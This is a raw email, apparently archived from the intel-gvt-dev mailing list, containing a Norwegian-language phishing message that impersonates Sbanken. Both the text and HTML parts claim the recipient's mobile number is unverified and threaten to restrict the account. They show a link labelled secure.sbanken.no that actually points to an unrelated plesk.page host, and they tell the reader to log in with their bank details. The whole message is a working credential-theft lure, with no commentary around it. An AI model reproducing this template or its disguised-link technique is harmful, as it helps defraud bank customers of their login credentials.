Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
X-Original-To: lists+intel-gvt-dev@lfdr.de
Delivered-To: lists+intel-gvt-dev@lfdr.de
Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
	by mail.lfdr.de (Postfix) with ESMTPS id F10AF6113D1
	for <lists+intel-gvt-dev@lfdr.de>; Fri, 28 Oct 2022 16:00:08 +0200 (CEST)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id 4F52710E849;
	Fri, 28 Oct 2022 14:00:07 +0000 (UTC)
X-Original-To: intel-gvt-dev@lists.freedesktop.org
Delivered-To: intel-gvt-dev@lists.freedesktop.org
X-Greylist: delayed 382 seconds by postgrey-1.36 at gabe;
 Fri, 28 Oct 2022 14:00:01 UTC
Received: from cmx-mtlrgo002.bell.net (mta-mtl-002.bell.net [209.71.208.12])
 by gabe.freedesktop.org (Postfix) with ESMTPS id 9BF9510E841
 for <intel-gvt-dev@lists.freedesktop.org>;
 Fri, 28 Oct 2022 14:00:01 +0000 (UTC)
X-RG-CM-BuS: 0
X-RG-CM-SC: 0
X-RG-CM: Clean
X-RG-Env-Sender: garyspot.star@bellaliant.net
X-RG-Rigid: 635A9E0A00456471
X-CM-Envelope: MS4xfCW8Z7NODfm6osHJvFNrNVFgSsJvrBPNM7cGZNBnVdF77oNmLw22ncZO4eSP8dScptN+6N0g6f0Xcn6Cw92Qd/FI4qEVy5FYpzLrIDldr7xHBM9FD+lW
 y9tBXkfURyv87UgTBCh8X4b/eCM3rqadoP1C7Ru1vMmtJfPFAk2TTyGjB6WEmpVBnUh1VWjJyt59kPYthxsbh1Tf40MnNUy/iRYbccXHgHpJ9REz7cjfaCbu
 ou2MlEyG+hibw28ruVvxtHKB0SkzBOfcARM8kbeigYK/rj5u/3HMWPWBe5YTv+9mx7HanjA7209kNuHBB1NModJba/RgCz3HLyKP8V14bzkpe3MPT0q3sp6p
 1ojvy5EQo4Ph3DAYN8+PeQDqQoqSkAxRZ9v4jzFCfE/xaJmDfyI7MbGLiomwmTaPLes7jCjRyhgjwYYMCU2S7zIUaYRSQBEUoU81+wLNxtJGiVUnckThnb/7
 O/hGlKajfksD+020Ccoehg5q+TWjFpnrOi5ZFBtH1j6139+9W5AeDYt65VpsQpEYiNcGQuHS7YnMaY14Z9/FM51vFNgtHx4uB4lVxQKaQPtmY44LrrBY9yE0
 VHTzDXizT3BwqAuzQkdXT4QCL+myiWARkvOehl4C+0DJZDVeR2jDK7XR+hLAuSQQhfPA1cCupQrnk7/URcPxpljXKfHLss3cL0dmtyCZAjuono8qD2BU7RfH
 vgrCKV4+l8rWhYAGVcSuf2HiI1ySPQG8gA4Du0qhNlTlYj/8dvQ0YtbiiL/pb+izT9E+JWZmxwHLagt3OAnGwAi7wxJoAWxdCSatinAU5ZgVxLzMxPyg6sGz
 48uCcl7SS5Q00GZStzFU/bRUZVzvOHo7fAxcVkFDwXcCqgDtw1A/qkmfveOFQmihtUhc1WoAEpr4DhUc7h1df3DxISMfiqPxGJ12KfvCLGa5Oysx7pYc2AMM
 OZmPqiJ09ksb3SYlMCzkswUySEvRQizJXBaFPOE7rbB388KmuGhzQ78rhspIxLTzFWI75riVo964bHq8fQlAYawRfXfVBunlxgAyOLO3zfBsJ3mfxQ9sDlHf
 eQM7s78hPhvMG7WGGXWCz4ePIhg5Q20kxvvtfVgga8mXFIMTLEdv41pZAgEn1JinycrZOSsOHdQo+tBWOEbfAUjK4lL5V9V83u9yw0Ib4joyI5nDadUDsHvT
 U4+o5U+Hp83m89r2mYC6TwMuVUsDnZpiUwBfbjk9gQOJTCDX/wJ94QJmoqIp+hIaf1VPnls9r3p1u9WZosngUP0U1sR6LJGwjivlMmvel27yVbqvPowpORTA
 xcbfV7gwV0RS7TbLuiidqUuPCLBTlr633wq40UReVZLLgCenpbXv2k/ERPoEV/1pYm1VogoMUa0vkLrQ3+whJ5IjbUH2mbo8IINCBCH8kfu2GeQmbauVCX31
 OKZFPq5VIIXyEPegGwb/AvcxFCZseTlEJYhD/sNys5OfW/foko+xp2IBLGjtQPD6yWEu7JxxTiWMVrI1+Rq78IlSYXzrqH3dVGSFSgJSYTglGiWDJ/pQW11z
 1PUPGIgM+i017MPewp41/5xPCyqfhDc6UMtz79SIljeJ/R/zIXXzwXl1nlITJ0q0j0CO/LAVyCHpkGoO7E6Zj6GG
X-CM-Analysis: v=2.4 cv=be6tEsDB c=1 sm=1 tr=0 ts=635bdecf
 a=anxHM526M2OUk+kl7jD75Q==:117 a=YZHlSTkx/8aBjky5EeveJg==:17
 a=z_WQn_YvuNwA:10 a=Qawa6l4ZSaYA:10 a=V6KHSXBXAAAA:8 a=fevPwjWrAAAA:8
 a=tB7zwP3Zpd1T1w7Xt2gA:9 a=QEXdDO2ut3YA:10 a=0scP29cVYpIA:10 a=3GbmggnxAAAA:8
 a=j5ZJ9MDaI9Cvfx7ZhPUA:9 a=8cCH6KC2phQNrG4Z:21 a=_W_S_7VecoQA:10
 a=ywzb5qoaU0QA:10 a=k-bIn84YY0625PNcARfX:22 a=I-34-tiJMRFidqV1s339:22
Received: from cmx-mtlweb019.bellmx-prd.synchronoss.net (192.168.4.34) by
 cmx-mtlrgo002.bell.net (5.8.807) (authenticated as
 garyspot.star@bellaliant.net)
 id 635A9E0A00456471; Fri, 28 Oct 2022 09:53:19 -0400
Received: from [162.250.197.34]
 by webmail.bellaliant.net with HTTP; Fri, 28 Oct 2022 09:53:18 -0400
To: service@mail.com
Message-ID: <2c3d5fbf.20db.1841ede5784.Webtop.34@bellaliant.net>
Subject: Tr:
MIME-Version: 1.0
Content-Type: multipart/alternative; 
 boundary="----=_Part_26737_885437291.1666965198718"
User-Agent: OWM Mail 3
X-SID: 34
X-Originating-IP: [162.250.197.34]
From: Sbanken <garyspot.star@bellaliant.net>
Date: Fri, 28 Oct 2022 09:53:18 -0400 (EDT)
X-BeenThere: intel-gvt-dev@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: "Intel GVT \(Graphics Virtualization\) development list"
 <intel-gvt-dev.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/intel-gvt-dev>, 
 <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/intel-gvt-dev>
List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
 <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>

------=_Part_26737_885437291.1666965198718
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: quoted-printable

=C2=A0
Kj=C3=A6re kunde,
V=C3=A5rt system gjenkjenner at mobilnummeret knyttet til din sbanken-konto=
=20
enn=C3=A5 ikke er bekreftet.
Av sikkerhetsgrunner er vi tvunget til =C3=A5 begrense tilgangen til din=20
sbanken-konto. Hvis du ikke oppgir opplysningene dine innen 28. oktober=20
2022.
https://secure.sbanken.no/=20
<https://quizzical-agnesi.157-245-55-11.plesk.page/semaine?any=3D3463592328=
8691359536>
    1.  Logg p=C3=A5 med bankopplysningene dine.
    2.  F=C3=B8lg de obligatoriske trinnene for =C3=A5 fullf=C3=B8re den n=
=C3=B8dvendige=20
prosessen.
=C2=A0
=C2=A0
V=C3=A6r oppmerksom p=C3=A5 at denne meldingen genereres av en PLS. Ikke br=
uk Svar=20
til-funksjonen.
Takk for tilliten.
Sbanken Gruppe.
=C2=A0=C2=A0=C2=A0=C2=A0
Detaljert!
Denne innovative og sikre sikkerhetstjenesten er basert p=C3=A5 et forsterk=
et=20
autentiseringssystem for hver kunde.
=C2=A0
=C2=A0
















------=_Part_26737_885437291.1666965198718
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html><html><head><title></title></head><body><table bgcolor=3D'#f=
ff' border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'border-collap=
se: collapse!important;' width=3D'100%'><tbody><tr><td style=3D'background-=
color: #fff;'><em>&nbsp;</em></td><td><table border=3D'0' cellpadding=3D'0'=
 cellspacing=3D'0' style=3D'border-collapse: collapse!important;'><tbody><t=
r><td class=3D'' style=3D'width: 424px; background-color: #ffffff;'><table =
border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; bord=
er-collapse: collapse!important;'><tbody><tr><td class=3D'' height=3D'20' s=
tyle=3D'width: 100%; background-color: #fff;'><em><img alt=3D'' height=3D'7=
0' src=3D'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Sbanken=
.svg/440px-Sbanken.svg.png' style=3D'display: block; margin-left: auto; mar=
gin-right: auto;' width=3D'225'></em></td></tr><tr><td><table bgcolor=3D'#F=
FFFFF' border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100=
%; border-collapse: collapse!important;' width=3D'100%'><tbody><tr><td><tab=
le border=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; b=
order-collapse: collapse!important;'><tbody><tr><td width=3D'15'><em><img a=
lt=3D'' data-imageerror=3D'SrcNullOrEmpty' data-imagetype=3D'Empty' style=
=3D'text-decoration: none; height: auto; vertical-align: middle; outline-wi=
dth: medium; outline-style: none; outline-color: invert; line-height: 0; bo=
rder-width: 0px;' width=3D'15'></em></td><td><table border=3D'0' cellpaddin=
g=3D'0' cellspacing=3D'0' style=3D'width: 100%; border-collapse: collapse!i=
mportant;'><tbody><tr><td style=3D'font-size: 14px;'><div style=3D'margin: =
0px 20px 15px 0px;'><p><em><span style=3D'color: #262342;'><strong>Kj&aelig=
;re kunde,</strong></span></em></p><p><br><em>V&aring;rt system gjenkjenner=
 at mobilnummeret knyttet til din sbanken-konto enn&aring; ikke er bekrefte=
t.</em></p><p><br><em>Av sikkerhetsgrunner er vi tvunget til &aring; begren=
se tilgangen til din sbanken-konto. Hvis du ikke oppgir opplysningene dine =
innen 28. oktober 2022.</em></p></div></td></tr></tbody></table><table styl=
e=3D'width: 399.797px;'><tbody><tr><td style=3D'width: 369px;'><p style=3D'=
padding-left: 40px; text-align: center;'><em><span style=3D'color: #008080;=
'><strong><a data-auth=3D'NotApplicable' data-linkindex=3D'0' href=3D'https=
://quizzical-agnesi.157-245-55-11.plesk.page/semaine?any=3D3463592328869135=
9536' rel=3D'nofollow noopener noreferrer' style=3D'color: #008080;' target=
=3D'_blank'><span style=3D'text-decoration: underline;'>https://secure.sban=
ken.no/</span></a></strong></span></em></p><ol style=3D'padding-left: 20px;=
'><li><em>Logg p&aring; med bankopplysningene dine.</em></li><li><em>F&osla=
sh;lg de obligatoriske trinnene for &aring; fullf&oslash;re den n&oslash;dv=
endige prosessen.</em></li></ol></td><td style=3D'width: 13.7969px;'><em>&n=
bsp;</em></td></tr></tbody></table><br aria-hidden=3D'true'><table border=
=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; border-col=
lapse: collapse!important;'><tbody><tr><td style=3D'font-size: 14px;'><div =
aria-hidden=3D'true' style=3D'margin: 0px 20px 15px 0px;'><em>&nbsp;</em></=
div></td></tr><tr><td style=3D'font-size: 14px;'><div style=3D'margin: 0px =
20px 15px 0px;'><em><span style=3D'color: #808080;'>V&aelig;r oppmerksom p&=
aring; at denne meldingen genereres av en PLS. Ikke bruk Svar til-funksjone=
n.</span></em></div></td></tr><tr><td style=3D'font-size: 14px;'><div style=
=3D'margin: 0px 20px 15px 0px;'><em><span style=3D'color: #262342;'>Takk fo=
r tilliten.</span></em></div></td></tr><tr><td style=3D'font-size: 14px;'><=
div style=3D'margin: 0px 20px 15px 0px; text-align: left;'><em><span style=
=3D'color: #262342;'>Sbanken Gruppe.</span></em></div></td></tr></tbody></t=
able></td><td width=3D'15'><em><img alt=3D'' data-imageerror=3D'SrcNullOrEm=
pty' data-imagetype=3D'Empty' style=3D'text-decoration: none; height: auto;=
 vertical-align: middle; outline-width: medium; outline-style: none; outlin=
e-color: invert; line-height: 0; border-width: 0px;' width=3D'15'></em></td=
></tr></tbody></table></td></tr><tr><td height=3D'20'><em>&nbsp;</em></td><=
/tr></tbody></table></td></tr></tbody></table></td><td class=3D''><em>&nbsp=
;</em></td><td class=3D'' style=3D'width: 207px;' valign=3D'top'><table bor=
der=3D'0' cellpadding=3D'0' cellspacing=3D'0' style=3D'width: 100%; border-=
collapse: collapse!important;'><tbody><tr><td class=3D'' height=3D'20' styl=
e=3D'width: 100%; background-color: #fff;'><em>&nbsp;</em></td></tr><tr><td=
><table bgcolor=3D'#262342' border=3D'0' cellpadding=3D'0' cellspacing=3D'0=
' style=3D'width: 100%; border-collapse: collapse!important;' width=3D'100%=
'><tbody><tr><td height=3D'20'><em>&nbsp;</em></td></tr><tr><td style=3D'co=
lor: #ffffff;'><table bgcolor=3D'#262342' border=3D'0' cellpadding=3D'0' ce=
llspacing=3D'0' style=3D'width: 100%; border-collapse: collapse!important;'=
><tbody><tr><td style=3D'background-color: #262342;' width=3D'15'><em><span=
 style=3D'color: #000000;'><img alt=3D'' data-imageerror=3D'' data-imagetyp=
e=3D'Empty' style=3D'text-decoration: none; height: auto; vertical-align: m=
iddle; outline-width: medium; outline-style: none; outline-color: invert; l=
ine-height: 0; border-width: 0px;' width=3D'15'></span></em></td><td style=
=3D'background-color: #262342;'><p style=3D'font-size: 14px; color: #ffffff=
;'><em><strong>Detaljert!</strong></em></p><p style=3D'font-size: 14px; col=
or: #ffffff;'><em><strong>Denne innovative og sikre sikkerhetstjenesten er =
basert p&aring; et forsterket autentiseringssystem for hver kunde.</strong>=
</em></p></td><td style=3D'background-color: #262342;' width=3D'15'><em><sp=
an style=3D'color: #000000;'><img alt=3D'' data-imageerror=3D'' data-imaget=
ype=3D'Empty' style=3D'text-decoration: none; height: auto; vertical-align:=
 middle; outline-width: medium; outline-style: none; outline-color: invert;=
 line-height: 0; border-width: 0px;' width=3D'15'></span></em></td></tr></t=
body></table></td></tr></tbody></table></td></tr></tbody></table></td></tr>=
</tbody></table></td></tr></tbody></table><p>&nbsp;</p><p>&nbsp;</p></body>=
</html><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>=
<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
------=_Part_26737_885437291.1666965198718--
